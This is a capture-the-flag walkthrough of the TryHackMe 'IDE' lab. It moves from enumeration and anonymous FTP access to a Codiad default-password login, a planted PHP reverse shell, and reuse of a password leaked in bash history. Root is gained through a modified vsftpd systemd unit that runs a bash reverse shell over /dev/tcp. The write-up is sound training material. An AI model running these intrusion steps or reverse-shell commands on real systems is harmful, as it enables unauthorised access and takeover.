# TryHackMe - IDE

[Room link](https://tryhackme.com/room/ide)

---

## Enumeration

I use nmap for scanning the machine ports and services avalaibles.

First scan :

```bash
$ nmap -sS <target_ip>
[...]
Host is up (0.013s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

We can see we have few interesting services like ftp and http. We don't focus ssh for the moment.

Second scan : full scan :

```bash
$ sudo nmap -sS -T5 -p- <target_ip>
[...]
Not shown: 65495 closed ports, 36 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
62337/tcp open  unknown
```

---

### FTP

First, i try to connect to the ftp service remotly on anymous.

```bash
$ ftp <target_ip>
[...]
Name (10.10.236.174:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
```

Ok, we are connected as anonymous. Let's see what it is avalaible.

```bash
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        114          4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
drwxr-xr-x    2 0        0            4096 Jun 18  2021 ...
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             151 Jun 18  2021 -
drwxr-xr-x    2 0        0            4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
226 Directory send OK.
ftp> get -
local: ./- remote: -
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for - (151 bytes).
226 Transfer complete.
151 bytes received in 0.00 secs (1.5653 MB/s)
ftp> 
```

We have download the file named "-". Let's see this file content.

```txt
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```

---

### HTTP 80

A web site is avalaible on the port 80. When you request http://<target_ip>/, we have a response with the apache default page. The next step it is to enumerate pages.

This website seems empty after a gobuster scan.

---

### HTTP 62337

Let's do an another web content scan, we will use dirb this time :

```bash
$ dirb http://<target_ip>/
[...]
---- Scanning URL: http://10.10.207.204:62337/ ----
==> DIRECTORY: http://10.10.207.204:62337/components/                                                                                                                             
==> DIRECTORY: http://10.10.207.204:62337/data/                                                                                                                                   
+ http://10.10.207.204:62337/favicon.ico (CODE:200|SIZE:1150)                                                                                                                     
+ http://10.10.207.204:62337/index.php (CODE:200|SIZE:5239)                                                                                                                       
==> DIRECTORY: http://10.10.207.204:62337/js/                                                                                                                                     
==> DIRECTORY: http://10.10.207.204:62337/languages/                                                                                                                             
==> DIRECTORY: http://10.10.207.204:62337/lib/                                                                                                                                   
==> DIRECTORY: http://10.10.207.204:62337/plugins/                                                                                                                               
+ http://10.10.207.204:62337/server-status (CODE:403|SIZE:281)                                                                                                                   
==> DIRECTORY: http://10.10.207.204:62337/themes/ 
```

After checked some directories, we can find an interresting information in this page : http://10.10.207.204:62337/js/system.js

```txt
/*
 *  Copyright (c) Codiad & Kent Safranski (codiad.com), distributed
 *  as-is and without warranty under the MIT License. See
 *  [root]/license.txt for more. This information must remain intact.
 */
```

We need to search the default password of Codiad, like drac said previously. In fact, he reset the john's password with the default password.

After few research the default password is ... password.

---

## Exploitation

Let's try to connect via the form on the index page with this credentials : john/password. That works !

It is possible to add a project. If we add a projet with a random name like "Test" and this path : /var/www/html/codiad we will see and we can modify some files presents on the site. Let's try to modify a file with a reverse shell. For example, we can use /languages/bg.php and replace the content with a php reverse shell. Dont't forget to replace your IP address and save. Now, we need to set a netcat listenner with this command :

```bash
$ nc -lnvp <listenning_port>
```

Now, we need to call this page /languages/bg.php.

Nice ! We get a shell on our netcat listenner.

```bash
Listening on [0.0.0.0] (family 0, port 1234)
Connection from 10.10.124.121 55972 received!
Linux ide 4.15.0-147-generic #151-Ubuntu SMP Fri Jun 18 19:21:19 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 20:42:00 up 53 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

If we check the user drac history, we can see this following entry :

```bash
/home/drac
$ cat .bash_history
mysql -u drac -p 'Th3dRaCULa1sR3aL'
```

We can try to connect on the ssh to the target machine with this password.

```bash
Last login: Wed Aug  4 06:36:42 2021 from 192.168.0.105
drac@ide:~$ 
```

That works. We are connected as drac user.

---

## User flag

Now, we can get the user's flag at /home/drac/user.txt

---

Now, we need to privesc to the user root. 

If we check the sudo's commands of the drac user we can see this :

```bash
drac@ide:/$ sudo -l
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```

We can modify the service like this, to set a listenner shell at the restart of the service :

```bash
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'exec bash -i &>/dev/tcp/10.10.6.186/1234 <&1'
```

Now reload daemons and restart the service, don't forget to set up a nc listenner on the right port.

```bash
$ systemctl daemon-reload
[...]
$ /usr/sbin/service vsftpd restart
```

Finally, if you check we check our nc listenner, we are root !

---

## Root flag

The flag root's flag is in /root/root.txt
